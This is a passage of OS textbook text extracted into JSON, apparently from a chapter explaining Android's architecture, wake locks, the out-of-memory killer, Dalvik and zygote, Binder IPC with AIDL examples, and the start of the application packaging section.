collaborate in rich and\r\nsecure ways. Mobile applications are in some ways a return back to\r\nshell commands: rather than the increasingly large monolithic design\r\nof desktop applications, they are targeted and focused for specific\r\nneeds. To help support this, the operating system should provide new\r\ntypes of facilities for these applications to collaborate together to cre\u0002ate a larger whole.\r\n8. Create a full general-purpose operating system. Mobile devices are a\r\nnew expression of general purpose computing, not something simpler\r\nthan our traditional desktop operating systems. Android’s design\r\nshould be rich enough that it can grow to be at least as capable as a\r\ntraditional operating system.\nSEC. 10.8 ANDROID 809"
          },
          "10.8.4 Android Architecture": {
            "page": 840,
            "content": "10.8.4 Android Architecture\r\nAndroid is built on top of the standard Linux kernel, with only a few signifi\u0002cant extensions to the kernel itself that will be discussed later. Once in user space,\r\nhowever, its implementation is quite different from a traditional Linux distribution\r\nand uses many of the Linux features you already understand in very different ways.\r\nAs in a traditional Linux system, Android’s first user-space process is init,\r\nwhich is the root of all other processes. The daemons Android’s init process starts\r\nare different, however, focused more on low-level details (managing file systems\r\nand hardware access) rather than higher-level user facilities like scheduling cron\r\njobs. Android also has an additional layer of processes, those running Dalvik’s\r\nJava language environment, which are responsible for executing all parts of the\r\nsystem implemented in Java.\r\nFigure 10-39 illustrates the basic process structure of Android. First is the init\r\nprocess, which spawns a number of low-level daemon processes. One of these is\r\nzygote, which is the root of the higher-level Java language processes.\r\nappN\r\nsystem_server phone\r\nDalvik Dalvik\r\nDalvik\r\nzygote Daemons\r\nSystem\r\nprocesses\r\nApp\r\nprocesses\r\napp2 app1\r\nDalvik Dalvik\r\ninstalld servicemanager\r\ninit\r\nadbd\r\nKernel\r\nDalvik\r\nFigure 10-39. Android process hierarchy.\r\nAndroid’s init does not run a shell in the traditional way, since a typical\r\nAndroid device does not have a local console for shell access. Instead, the daemon\r\nprocess adbd listens for remote connections (such as over USB) that request shell\r\naccess, forking shell processes for them as needed.\r\nSince most of Android is written in the Java language, the zygote daemon and\r\nprocesses it starts are central to the system. The first process zygote always starts\n810 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nis called system server, which contains all of the core operating system services.\r\nKe y parts of this are the power manager, package manager, window manager, and\r\nactivity manager.\r\nOther processes will be created from zygote as needed. Some of these are\r\n‘‘persistent’’ processes that are part of the basic operating system, such as the tele\u0002phony stack in the phone process, which must remain always running. Additional\r\napplication processes will be created and stopped as needed while the system is\r\nrunning.\r\nApplications interact with the operating system through calls to libraries pro\u0002vided by it, which together compose the Android framework. Some of these li\u0002braries can perform their work within that process, but many will need to perform\r\ninterprocess communication with other processes, often services in the sys\u0002tem server process.\r\nFigure 10-40 shows the typical design for Android framework APIs that inter\u0002act with system services, in this case the package manager. The package manager\r\nprovides a framework API for applications to call in their local process, here the\r\nPackageManager class. Internally, this class must get a connection to the corres\u0002ponding service in the system server. To accomplish this, at boot time the sys\u0002tem server publishes each service under a well-defined name in the service man\u0002ager, a daemon started by init. The PackageManager in the application process\r\nretrieves a connection from the service manager to its system service using that\r\nsame name.\r\nOnce the PackageManager has connected with its system service, it can make\r\ncalls on it. Most application calls to PackageManager are implemented as\r\ninterprocess communication using Android’s Binder IPC mechanism, in this case\r\nmaking calls to the PackageManagerService implementation in the system server.\r\nThe implementation of PackageManagerService arbitrates interactions across all\r\nclient applications and maintains state that will be needed by multiple applications."
          },
          "10.8.5 Linux Extensions": {
            "page": 841,
            "content": "10.8.5 Linux Extensions\r\nFor the most part, Android includes a stock Linux kernel providing standard\r\nLinux features. Most of the interesting aspects of Android as an operating system\r\nare in how those existing Linux features are used. There are also, however,\r\nserveral significant extensions to Linux that the Android system relies on.\r\nWake Locks\r\nPower management on mobile devices is different than on traditional comput\u0002ing systems, so Android adds a new feature to Linux called wake locks (also called\r\nsuspend blockers) for managing how the system goes to sleep.\r\nOn a traditional computing system, the system can be in one of two power\r\nstates: running and ready for user input, or deeply asleep and unable to continue\nSEC. 10.8 ANDROID 811\r\nApplication process System server\r\nApplication Code\r\nPackageManager PackageManagerService\r\nService manager\r\n\"package\"\r\nBinder IPC\r\nBinder IPC\r\nBinder IPC\r\nFigure 10-40. Publishing and interacting with system services.\r\nexecuting without an external interrupt such as pressing a power key. While run\u0002ning, secondary pieces of hardware may be turned on or off as needed, but the\r\nCPU itself and core parts of the hardware must remain in a powered state to handle\r\nincoming network traffic and other such events. Going into the lower-power sleep\r\nstate is something that happens relatively rarely: either through the user explicitly\r\nputting the system to sleep, or its going to sleep itself due to a relatively long inter\u0002val of user inactivity. Coming out of this sleep state requires a hardware interrupt\r\nfrom an external source, such as pressing a button on a keyboard, at which point\r\nthe device will wake up and turn on its screen.\r\nMobile device users have different expectations. Although the user can turn off\r\nthe screen in a way that looks like putting the device to sleep, the traditional sleep\r\nstate is not actually desired. While a device’s screen is off, the device still needs to\r\nbe able to do work: it needs to be able to receive phone calls, receive and process\r\ndata for incoming chat messages, and many other things.\r\nThe expectations around turning a mobile device’s screen on and off are also\r\nmuch more demanding than on a traditional computer. Mobile interaction tends to\r\nbe in many short bursts throughout the day: you receive a message and turn on the\r\ndevice to see it and perhaps send a one-sentence reply, you run into friends walking\n812 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\ntheir new dog and turn on the device to take a picture of her. In this kind of typical\r\nmobile usage, any delay from pulling the device out until it is ready for use has a\r\nsignificant negative impact on the user experience.\r\nGiven these requirements, one solution would be to just not have the CPU go\r\nto sleep when a device’s screen is turned off, so that it is always ready to turn back\r\non again. The kernel does, after all, know when there is no work scheduled for any\r\nthreads, and Linux (as well as most operating systems) will automatically make the\r\nCPU idle and use less power in this situation.\r\nAn idle CPU, however, is not the same thing as true sleep. For example:\r\n1. On many chipsets the idle state uses significantly more power than a\r\ntrue sleep state.\r\n2. An idle CPU can wake up at any moment if some work happens to\r\nbecome available, even if that work is not important.\r\n3. Just having the CPU idle does not tell you that you can turn off other\r\nhardware that would not be needed in a true sleep.\r\nWake locks on Android allow the system to go in to a deeper sleep mode, with\u0002out being tied to an explicit user action like turning the screen off. The default\r\nstate of the system with wake locks is that the device is asleep. When the device is\r\nrunning, to keep it from going back to sleep something needs to be holding a wake\r\nlock.\r\nWhile the screen is on, the system always holds a wake lock that prevents the\r\ndevice from going to sleep, so it will stay running, as we expect.\r\nWhen the screen is off, however, the system itself does not generally hold a\r\nwake lock, so it will stay out of sleep only as long as something else is holding\r\none. When no more wake locks are held, the system goes to sleep, and it can come\r\nout of sleep only due to a hardware interrupt.\r\nOnce the system has gone to sleep, a hardware interrupt will wake it up again,\r\nas in a traditional operating system. Some sources of such an interrupt are time\u0002based alarms, events from the cellular radio (such as for an incoming call), incom\u0002ing network traffic, and presses on certain hardware buttons (such as the power\r\nbutton). Interrupt handlers for these events require one change from standard\r\nLinux: they need to aquire an initial wake lock to keep the system running after it\r\nhandles the interrupt.\r\nThe wake lock acquired by an interrupt handler must be held long enough to\r\ntransfer control up the stack to the driver in the kernel that will continue processing\r\nthe event. That kernel driver is then responsible for acquiring its own wake lock,\r\nafter which the interrupt wake lock can be safely released without risk of the sys\u0002tem going back to sleep.\r\nIf the driver is then going to deliver this event up to user space, a similar hand\u0002shake is needed. The driver must ensure that it continues to hold the wake lock un\u0002til it has delivered the event to a waiting user process and ensured there has been an\nSEC. 10.8 ANDROID 813\r\nopportunity there to acquire its own wake lock. This flow may continue across\r\nsubsystems in user space as well; as long as something is holding a wake lock, we\r\ncontinue performing the desired processing to respond to the event. Once no more\r\nwake locks are held, however, the entire system falls back to sleep and all proc\u0002essing stops.\r\nOut-Of-Memory Killer\r\nLinux includes an ‘‘out-of-memory killer’’ that attempts to recover when mem\u0002ory is extremely low. Out-of-memory situations on modern operating systems are\r\nnebulous affairs. With paging and swap, it is rare for applications themselves to see\r\nout-of-memory failures. However, the kernel can still get in to a situation where it\r\nis unable to find available RAM pages when needed, not just for a new allocation,\r\nbut when swapping in or paging in some address range that is now being used.\r\nIn such a low-memory situation, the standard Linux out-of-memory killer is a\r\nlast resort to try to find RAM so that the kernel can continue with whatever it is\r\ndoing. This is done by assigning each process a ‘‘badness’’ lev el, and simply\r\nkilling the process that is considered the most bad. A process’s badness is based on\r\nthe amount of RAM being used by the process, how long it has been running, and\r\nother factors; the goal is to kill large processes that are hopefully not critical.\r\nAndroid puts special pressure on the out-of-memory killer. It does not have a\r\nswap space, so it is much more common to be in out-of-memory situations: there is\r\nno way to relieve memory pressure except by dropping clean RAM pages mapped\r\nfrom storage that has been recently used. Even so, Android uses the standard\r\nLinux configuration to over-commit memory—that is, allow address space to be al\u0002located in RAM without a guarantee that there is available RAM to back it. Over\u0002commit is an extremely important tool for optimizing memory use, since it is com\u0002mon to mmap large files (such as executables) where you will only be needing to\r\nload into RAM small parts of the overall data in that file.\r\nGiven this situation, the stock Linux out-of-memory killer does not work well,\r\nas it is intended more as a last resort and has a hard time correctly identifying good\r\nprocesses to kill. In fact, as we will discuss later, Android relies extensively on the\r\nout-of-memory killer running regularly to reap processes and make good choices\r\nabout which to select.\r\nTo address this, Android introduces its own out-of-memory killer to the kernel,\r\nwith different semantics and design goals. The Android out-of-memory killer runs\r\nmuch more aggressively: whenever RAM is getting ‘‘low.’’ Low RAM is identified\r\nby a tunable parameter indicating how much available free and cached RAM in the\r\nkernel is acceptable. When the system goes below that limit, the out-of-memory\r\nkiller runs to release RAM from elsewhere. The goal is to ensure that the system\r\nnever gets into bad paging states, which can negatively impact the user experience\r\nwhen foreground applications are competing for RAM, since their execution be\u0002comes much slower due to continual paging in and out.\n814 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nInstead of trying to guess which processes should be killed, the Android\r\nout-of-memory killer relies very strictly on information provided to it by user\r\nspace. The traditional Linux out-of-memory killer has a per-process oom adj pa\u0002rameter that can be used to guide it toward the best process to kill by modifying the\r\nprocess’ overall badness score. Android’s out-of-memory killer uses this same pa\u0002rameter, but as a strict ordering: processes with a higher oom adj will always be\r\nkilled before those with lower ones. We will discuss later how the Android system\r\ndecides to assign these scores."
          },
          "10.8.6 Dalvik": {
            "page": 845,
            "content": "10.8.6 Dalvik\r\nDalvik implements the Java language environment on Android that is responsi\u0002ble for running applications as well as most of its system code. Almost everything\r\nin the system service process—from the package manager, through the window\r\nmanager, to the activity manager—is implemented with Java language code ex\u0002ecuted by Dalvik.\r\nAndroid is not, however, a Java-language platform in the traditional sense.\r\nJava code in an Android application is provided in Dalvik’s bytecode format, based\r\naround a register machine rather than Java’s traditional stack-based bytecode.\r\nDalvik’s bytecode format allows for faster interpretation, while still supporting JIT\r\n(Just-in-Time) compilation. Dalvik bytecode is also more space efficient, both on\r\ndisk and in RAM, through the use of string pooling and other techniques.\r\nWhen writing Android applications, source code is written in Java and then\r\ncompiled into standard Java bytecode using traditional Java tools. Android then\r\nintroduces a new step: converting that Java bytecode into Dalvik’s more compact\r\nbytecode representation. It is the Dalvik bytecode version of an application that is\r\npackaged up as the final application binary and ultimately installed on the device.\r\nAndroid’s system architecture leans heavily on Linux for system primitives, in\u0002cluding memory management, security, and communication across security bound\u0002aries. It does not use the Java language for core operating system concepts—there\r\nis little attempt to abstract away these important aspects of the underlying Linux\r\noperating system.\r\nOf particular note is Android’s use of processes. Android’s design does not\r\nrely on the Java language for isolation between applications and the system, but\r\nrather takes the traditional operating system approach of process isolation. This\r\nmeans that each application is running in its own Linux process with its own\r\nDalvik environment, as are the system server and other core parts of the platform\r\nthat are written in Java.\r\nUsing processes for this isolation allows Android to leverage all of Linux’s\r\nfeatures for managing processes, from memory isolation to cleaning up all of the\r\nresources associated with a process when it goes away. In addition to processes,\r\ninstead of using Java’s SecurityManager architecture, Android relies exclusively on\r\nLinux’s security features.\nSEC. 10.8 ANDROID 815\r\nThe use of Linux processes and security greatly simplifies the Dalvik environ\u0002ment, since it is no longer responsible for these critical aspects of system stability\r\nand robustness. Not incidentally, it also allows applications to freely use native\r\ncode in their implementation, which is especially important for games which are\r\nusually built with C++-based engines.\r\nMixing processes and the Java language like this does introduce some chal\u0002lenges. Bringing up a fresh Java-language environment can take a second, even on\r\nmodern mobile hardware. Recall one of the design goals of Android, to be able to\r\nquickly launch applications, with a target of 200 msec. Requiring that a fresh\r\nDalvik process be brought up for this new application would be well beyond that\r\nbudget. A 200-msec launch is hard to achieve on mobile hardware, even without\r\nneeding to initialize a new Java-language environment.\r\nThe solution to this problem is the zygote native daemon that we briefly men\u0002tioned previously. Zygote is responsible for bringing up and initializing Dalvik, to\r\nthe point where it is ready to start running system or application code written in\r\nJava. All new Dalvik-based processes (system or application) are forked from\r\nzygote, allowing them to start execution with the environment already ready to go.\r\nIt is not just Dalvik that zygote brings up. Zygote also preloads many parts of\r\nthe Android framework that are commonly used in the system and application, as\r\nwell as loading resources and other things that are often needed.\r\nNote that creating a new process from zygote involves a Linux fork, but there is\r\nno exec call. The new process is a replica of the original zygote process, with all\r\nof its preinitialized state already set up and ready to go. Figure 10-41 illustrates\r\nhow a new Java application process is related to the original zygote process. After\r\nthe fork, the new process has its own separate Dalvik environment, though it is\r\nsharing all of the preloaded and initialed data with zygote through copy-on-write\r\npages. All that now remains to have the new running process ready to go is to give\r\nit the correct identity (UID etc.), finish any initialization of Dalvik that requires\r\nstarting threads, and loading the application or system code to be run.\r\nIn addition to launch speed, there is another benefit that zygote brings. Because\r\nonly a fork is used to create processes from it, the large number of dirty RAM\r\npages needed to initialize Dalvik and preload classes and resources can be shared\r\nbetween zygote and all of its child processes. This sharing is especially important\r\nfor Android’s environment, where swap is not available; demand paging of clean\r\npages (such as executable code) from ‘‘disk’’ (flash memory) is available. However\r\nany dirty pages must stay locked in RAM; they cannot be paged out to ‘‘disk.’’"
          },
          "10.8.7 Binder IPC": {
            "page": 846,
            "content": "10.8.7 Binder IPC\r\nAndroid’s system design revolves significantly around process isolation, be\u0002tween applications as well as between different parts of the system itself. This re\u0002quires a large amount of interprocess-communication to coordinate between the\r\ndifferent processes, which can take a large amount of work to implement and get\n816 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nPreloaded resources\r\nPreloaded classes\r\nDalvik\r\nCopy-on-write\r\nDalvik\r\nPreloaded classes\r\nPreloaded resources\r\nApplication classes\r\nand resources\r\nZygote App process\r\nFigure 10-41. Creating a new Dalvik process from zygote.\r\nright. Android’s Binder interprocess communication mechanism is a rich general\u0002purpose IPC facility that most of the Android system is built on top of.\r\nThe Binder architecture is divided into three layers, shown in Fig. 10-42. At\r\nthe bottom of the stack is a kernel module that implements the actual cross-process\r\ninteraction and exposes it through the kernel’s ioctl function. (ioctl is a gener\u0002al-purpose kernel call for sending custom commands to kernel drivers and mod\u0002ules.) On top of the kernel module is a basic object-oriented user-space API, al\u0002lowing applications to create and interact with IPC endpoints through the IBinder\r\nand Binder classes. At the top is an interface-based programming model where ap\u0002plications declare their IPC interfaces and do not otherwise need to worry about\r\nthe details of how IPC happens in the lower layers.\r\nBinder Kernel Module\r\nRather than use existing Linux IPC facilities such as pipes, Binder includes a\r\nspecial kernel module that implements its own IPC mechanism. The Binder IPC\r\nmodel is different enough from traditional Linux mechanisms that it cannot be ef\u0002ficiently implemented on top of them purely in user space. In addition, Android\r\ndoes not support most of the System V primitives for cross-process interaction\r\n(semaphores, shared memory segments, message queues) because they do not pro\u0002vide robust semantics for cleaning up their resources from buggy or malicious ap\u0002plications.\r\nThe basic IPC model Binder uses is the RPC (remote procedure call). That\r\nis, the sending process is submitting a complete IPC operation to the kernel, which\nSEC. 10.8 ANDROID 817\r\nPlatform / Application\r\nInterface definitions\r\nMethod calls\r\nIlnterface / aidl\r\ntransact() onTransact()\r\nIBinder / Binder\r\nBinder user space\r\ncommand Codes Result codes\r\nioctl()\r\nBinder kernel module\r\nFigure 10-42. Binder IPC architecture.\r\nis executed in the receiving process; the sender may block while the receiver ex\u0002ecutes, allowing a result to be returned back from the call. (Senders optionally\r\nmay specify they should not block, continuing their execution in parallel with the\r\nreceiver.) Binder IPC is thus message based, like System V message queues, rath\u0002er than stream based as in Linux pipes. A message in Binder is referred to as a\r\ntransaction, and at a higher level can be viewed as a function call across proc\u0002esses.\r\nEach transaction that user space submits to the kernel is a complete operation:\r\nit identifies the target of the operation and identity of the sender as well as the\r\ncomplete data being delivered. The kernel determines the appropriate process to\r\nreceive that transaction, delivering it to a waiting thread in the process.\r\nFigure 10-43 illustrates the basic flow of a transaction. Any thread in the orig\u0002inating process may create a transaction identifying its target, and submit this to\r\nthe kernel. The kernel makes a copy of the transaction, adding to it the identity of\n818 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nthe sender. It determines which process is responsible for the target of the transac\u0002tion and wakes up a thread in the process to receive it. Once the receiving process\r\nis executing, it determines the appropriate target of the transaction and delivers it.\r\nProcess 1 Process 2\r\nTransaction\r\nTo: Object1\r\nFrom: Process 1\r\n(Data)\r\nObject1\r\nThread pool\r\nTransaction\r\nTo: Object1\r\n(Data)\r\nThread pool\r\nKernel\r\nTransaction\r\nTo: Object1\r\nFrom: Process 1\r\n(Data)\r\nT1 T1 T2 T2\r\nTa\r\nFigure 10-43. Basic Binder IPC transaction.\r\n(For the discussion here, we are simplifying the the way transaction data\r\nmoves through the system as two copies, one to the kernel and one to the receiving\r\nprocess’s address space. The actual implementation does this in one copy. For\r\neach process that can receive transactions, the kernel creates a shared memory area\r\nwith it. When it is handling a transaction, it first determines the process that will\r\nbe receiving that transaction and copies the data directly into that shared address\r\nspace.)\r\nNote that each process in Fig. 10-43 has a ‘‘thread pool.’’ This is one or more\r\nthreads created by user space to handle incoming transactions. The kernel will dis\u0002patch each incoming transaction to a thread currently waiting for work in that proc\u0002ess’s thread pool. Calls into the kernel from a sending process however do not\r\nneed to come from the thread pool—any thread in the process is free to initiate a\r\ntransaction, such as Ta in Fig. 10-43.\r\nWe hav e already seen that transactions given to the kernel identify a target ob\u0002ject; howev er, the kernel must determine the receiving process. To accomplish\r\nthis, the kernel keeps track of the available objects in each process and maps them\r\nto other processes, as shown in Fig. 10-44. The objects we are looking at here are\r\nsimply locations in the address space of that process. The kernel only keeps track\r\nof these object addresses, with no meaning attached to them; they may be the loca\u0002tion of a C data structure, C++ object, or anything else located in that process’s ad\u0002dress space.\r\nReferences to objects in remote processes are identified by an integer handle,\r\nwhich is much like a Linux file descriptor. For example, consider Object2a in\nSEC. 10.8 ANDROID 819\r\nProcess 2—this is known by the kernel to be associated with Process 2, and further\r\nthe kernel has assigned Handle 2 for it in Process 1. Process 1 can thus submit a\r\ntransaction to the kernel targeted to its Handle 2, and from that the kernel can de\u0002termine this is being sent to Process 2 and specifically Object2a in that process.\r\nProcess 1\r\nProcess 1 Process 2\r\nObject1a Object1a Object2a Object2a\r\nObject2b Object2b Object1b Object1b\r\nHandle 2\r\nHandle 2\r\nHandle 1 Handle 1\r\nHandle 2\r\nHandle 2\r\nHandle 3 Handle 3\r\nKernel Process 2\r\nFigure 10-44. Binder cross-process object mapping.\r\nAlso like file descriptors, the value of a handle in one process does not mean\r\nthe same thing as that value in another process. For example, in Fig. 10-44, we can\r\nsee that in Process 1, a handle value of 2 identifies Object2a; howev er, in Process\r\n2, that same handle value of 2 identifies Object1a. Further, it is impossible for one\r\nprocess to access an object in another process if the kernel has not assigned a hand\u0002le to it for that process. Again in Fig. 10-44, we can see that Process 2’s Object2b\r\nis known by the kernel, but no handle has been assigned to it for Process 1. There\r\nis thus no path for Process 1 to access that object, even if the kernel has assigned\r\nhandles to it for other processes.\r\nHow do these handle-to-object associations get set up in the first place?\r\nUnlike Linux file descriptors, user processes do not directly ask for handles. In\u0002stead, the kernel assigns handles to processes as needed. This process is illustrated\r\nin Fig. 10-45. Here we are looking at how the reference to Object1b from Process\r\n2 to Process 1 in the previous figure may have come about. The key to this is how\r\na transaction flows through the system, from left to right at the bottom of the fig\u0002ure.\r\nThe key steps shown in Fig. 10-45 are:\r\n1. Process 1 creates the initial transaction structure, which contains the\r\nlocal address Object1b.\r\n2. Process 1 submits the transaction to the kernel.\r\n3. The kernel looks at the data in the transaction, finds the address Ob\u0002ject1b, and creates a new entry for it since it did not previously know\r\nabout this address.\n820 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nProcess 1\r\nProcess 1 Process 2\r\nObject1b Object2a\r\nObject2a\r\nObject1b\r\nHandle 2\r\nHandle 2\r\nHandle 1\r\nHandle 2\r\nHandle 3\r\nHandle 3\r\nHandle 1\r\n1\r\n3\r\n4\r\n6\r\n5\r\n6\r\n8\r\nTransaction Transaction Transaction Transaction\r\nTo: Handle 2 To: Handle 2 To: Object2a\r\nFrom: Process 1 From: Process 1\r\nTo: Object2a\r\nFrom: Process 1\r\nData\r\nData\r\nObject1b\r\nData Data\r\nData Data\r\nObject1b Handle 3\r\nData\r\nData\r\nHandle 3\r\nKernel Process 2\r\n2 7\r\nFigure 10-45. Transferring Binder objects between processes.\r\n4. The kernel uses the target of the transaction, Handle 2, to determine\r\nthat this is intended for Object2a which is in Process 2.\r\n5. The kernel now rewrites the transaction header to be appropriate for\r\nProcess 2, changing its target to address Object2a.\r\n6. The kernel likewise rewrites the transaction data for the target proc\u0002ess; here it finds that Object1b is not yet known by Process 2, so a\r\nnew Handle 3 is created for it.\r\n7. The rewritten transaction is delivered to Process 2 for execution.\r\n8. Upon receiving the transaction, the process discovers there is a new\r\nHandle 3 and adds this to its table of available handles.\r\nIf an object within a transaction is already known to the receiving process, the\r\nflow is similar, except that now the kernel only needs to rewrite the transaction so\r\nthat it contains the previously assigned handle or the receiving process’s local ob\u0002ject pointer. This means that sending the same object to a process multiple times\r\nwill always result in the same identity, unlike Linux file descriptors where opening\r\nthe same file multiple times will allocate a different descriptor each time. The\r\nBinder IPC system maintains unique object identities as those objects move be\u0002tween processes.\r\nThe Binder architecture essentially introduces a capability-based security\r\nmodel to Linux. Each Binder object is a capability. Sending an object to another\r\nprocess grants that capability to the process. The receiving process may then make\r\nuse of whatever features the object provides. A process can send an object out to\r\nanother process, later receive an object from any process, and identify whether that\r\nreceived object is exactly the same object it originally sent out.\nSEC. 10.8 ANDROID 821\r\nBinder User-Space API\r\nMost user-space code does not directly interact with the Binder kernel module.\r\nInstead, there is a user-space object-oriented library that provides a simpler API.\r\nThe first level of these user-space APIs maps fairly directly to the kernel concepts\r\nwe have covered so far, in the form of three classes:\r\n1. IBinder is an abstract interface for a Binder object. Its key method is\r\ntransact, which submits a transaction to the object. The imple\u0002mentation receiving the transaction may be an object either in the\r\nlocal process or in another process; if it is in another process, this will\r\nbe delivered to it through the Binder kernel module as previously dis\u0002cussed.\r\n2. Binder is a concrete Binder object. Implementing a Binder subclass\r\ngives you a class that can be called by other processes. Its key meth\u0002od is onTransact, which receives a transaction that was sent to it. The\r\nmain responsibility of a Binder subclass is to look at the transaction\r\ndata it receives here and perform the appropriate operation.\r\n3. Parcel is a container for reading and writing data that is in a Binder\r\ntransaction. It has methods for reading and writing typed data—inte\u0002gers, strings, arrays—but most importantly it can read and write refer\u0002ences to any IBinder object, using the appropriate data structure for\r\nthe kernel to understand and transport that reference across processes.\r\nFigure 10-46 depicts how these classes work together, modifying Fig. 10-44\r\nthat we previously looked at with the user-space classes that are used. Here we see\r\nthat Binder1b and Binder2a are instances of concrete Binder subclasses. To per\u0002form an IPC, a process now creates a Parcel containing the desired data, and sends\r\nit through another class we have not yet seen, BinderProxy. This class is created\r\nwhenever a new handle appears in a process, thus providing an implementation of\r\nIBinder whose transact method creates the appropriate transaction for the call and\r\nsubmits it to the kernel.\r\nThe kernel transaction structure we had previously looked at is thus split apart\r\nin the user-space APIs: the target is represented by a BinderProxy and its data is\r\nheld in a Parcel. The transaction flows through the kernel as we previously saw\r\nand, upon appearing in user space in the receiving process, its target is used to de\u0002termine the appropriate receiving Binder object while a Parcel is constructed from\r\nits data and delivered to that object’s onTransact method.\r\nThese three classes now make it fairly easy to write IPC code:\r\n1. Subclass from Binder.\r\n2. Implement onTransact to decode and execute incoming calls.\r\n3. Implement corresponding code to create a Parcel that can be passed\r\nto that object’s transact method.\n822 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\nProcess 1\r\nBinder1b\r\nBinder1b\r\nBinder1b\r\nParcel\r\ntransact()\r\nBinderProxy\r\n(Handle 2)\r\nBinderProxy\r\n(Handle 3)\r\nonTransact()\r\nParcel\r\nBinder1b Binder2b\r\nBinder2a\r\nProcess 1 Process 2\r\nProcess 2\r\nHandle 1\r\nHandle 1\r\nHandle 2\r\nHandle 3\r\nHandle 3\r\nHandle 3\r\nHandle 2\r\nTransaction Transaction\r\nTo: Handle 2\r\nFrom: Process 1\r\nTo: Binder2a\r\nFrom: Process 1\r\nData\r\nData\r\nData\r\nData Data\r\nData Data\r\nData\r\nKernel\r\nFigure 10-46. Binder user-space API.\r\nThe bulk of this work is in the last two steps. This is the unmarshalling and\r\nmarshalling code that is needed to turn how we’d prefer to program—using sim\u0002ple method calls—into the operations that are needed to execute an IPC. This is\r\nboring and error-prone code to write, so we’d like to let the computer take care of\r\nthat for us.\r\nBinder Interfaces and AIDL\r\nThe final piece of Binder IPC is the one that is most often used, a high-level in\u0002terface-based programming model. Instead of dealing with Binder objects and\r\nParcel data, here we get to think in terms of interfaces and methods.\r\nThe main piece of this layer is a command-line tool called AIDL (for Android\r\nInterface Definition Language). This tool is an interface compiler, taking an ab\u0002stract description of an interface and generating from it the source code necessary\r\nto define that interface and implement the appropriate marshalling and unmar\u0002shalling code needed to make remote calls with it.\r\nFigure 10-47 shows a simple example of an interface defined in AIDL. This\r\ninterface is called IExample and contains a single method, print, which takes a sin\u0002gle String argument.\r\npackage com.example\r\ninterface IExample {\r\nvoid print(Str ing msg);\r\n}\r\nFigure 10-47. Simple interface described in AIDL.\nSEC. 10.8 ANDROID 823\r\nAn interface description like that in Fig. 10-47 is compiled by AIDL to gener\u0002ate three Java-language classes illustrated in Fig. 10-48:\r\n1. IExample supplies the Java-language interface definition.\r\n2. IExample.Stub is the base class for implementations of this inter\u0002face. It inherits from Binder, meaning it can be the recipient of IPC\r\ncalls; it inherits from IExample, since this is the interface being im\u0002plemented. The purpose of this class is to perform unmarshalling:\r\nturn incoming onTransact calls in to the appropriate method call of\r\nIExample. A subclass of it is then responsible only for implementing\r\nthe IExample methods.\r\n3. IExample.Proxy is the other side of an IPC call, responsible for per\u0002forming marshalling of the call. It is a concrete implementation of\r\nIExample, implementing each method of it to transform the call into\r\nthe appropriate Parcel contents and send it off through a transact call\r\non an IBinder it is communicating with.\r\nBinder IExample\r\nIExample.Stub IExample.Proxy IBinder\r\nFigure 10-48. Binder interface inheritance hierarchy.\r\nWith these classes in place, there is no longer any need to worry about the\r\nmechanics of an IPC. Implementors of the IExample interface simply derive from\r\nIExample.Stub and implement the interface methods as they normally would. Cal\u0002lers will receive an IExample interface that is implemented by IExample.Proxy, al\u0002lowing them to make regular calls on the interface.\r\nThe way these pieces work together to perform a complete IPC operation is\r\nshown in Fig. 10-49. A simple print call on an IExample interface turns into:\r\n1. IExample.Proxy marshals the method call into a Parcel, calling trans\u0002act on the underlying BinderProxy.\r\n2. BinderProxy constructs a kernel transaction and delivers it to the ker\u0002nel through an ioctl call.\r\n3. The kernel transfers the transaction to the intended process, delivering\r\nit to a thread that is waiting in its own ioctl call.\n824 CASE STUDY 1: UNIX, LINUX, AND ANDROID CHAP. 10\r\n4. The transaction is decoded back into a Parcel and onTransact called\r\non the appropriate local object, here ExampleImpl (which is a sub\u0002class of IExample.Stub).\r\n5. IExample.Stub decodes the Parcel into the appropriate method and\r\narguments to call, here calling print.\r\n6. The concrete implementation of print in ExampleImpl finally ex\u0002ecutes.\r\nProcess 1\r\nKernel\r\nProcess 2\r\nExamplelmpl\r\nIExample\r\nprint(\"hello\") \r\nIExample.Proxy print(\"hello\")\r\nIExample.Stub transact({print hello})\r\nonTransact({print hello})\r\nBinder BinderProxy\r\nioctl()\r\nioctl() binder_module\r\nFigure 10-49. Full path of an AIDL-based Binder IPC.\r\nThe bulk of Android’s IPC is written using this mechanism. Most services in\r\nAndroid are defined through AIDL and implemented as shown here. Recall the\r\nprevious Fig. 10-40 showing how the implementation of the package manager in\r\nthe system server process uses IPC to publish itself with the service manager for\r\nother processes to make calls to it. Tw o AIDL interfaces are involved here: one for\r\nthe service manager and one for the package manager. For example, Fig. 10-50\r\nshows the basic AIDL description for the service manager; it contains the getSer\u0002vice method, which other processes use to retrieve the IBinder of system service\r\ninterfaces like the package manager."
          },
          "10.8.8 Android Applications": {
            "page": 855,
            "content": "10.8.8 Android Applications\r\nAndroid provides an application model that is very different from the normal\r\ncommand-line environment in the Linux shell or even applications launched from a\r\ngraphical user interface. An application is not an executable file with a main entry\r\npoint; it is a container of everything that makes up that app: its code, graphical re\u0002sources, declarations about what it is to the system, and other data.\nSEC. 10.8 ANDROID 825\r\npackage android.os\r\ninterface IServiceManager {\r\nIBinder getService(Str ing name);\r\nvoid addService(Str ing name, IBinder binder);\r\n}\r\nFigure 10-50. Basic service manager AIDL interface.\r\nAn Android application by convention is a file with the apk extension, for\r\nAndroid Package. This file is actually a normal zip archive, containing everything\r\nabout the application. The important contents of an apk are:\r\n1. A manifest describing what the application is, what it does, and how\r\nto run it. The manifest must provide a package name for the applica\u0002tion, a Java-style scoped string (such as com.android.app.calculator),\r\nwhich uniquely identifies it.\r\n2. Resources needed by the application, including strings it displays to\r\nthe user, XML data for layouts and other descriptions, graphical bit\u0002maps, etc.\r\n3. The code itself, which may be Dalvik bytecode as well as native li\u0002brary code.\r\n4. Signing information, securely identifying the author.\r\nThe key part of the application for our purposes here is its manifest, which ap\u0002pears as a precompiled XML file named AndroidManifest.xml in the root of the\r\napk’s zip namespace. A complete example manifest declaration for a hypothetical\r\nemail application is shown in Fig. 10-51: it allows you to view and compose emails\r\nand also includes components needed for synchronizing its local email 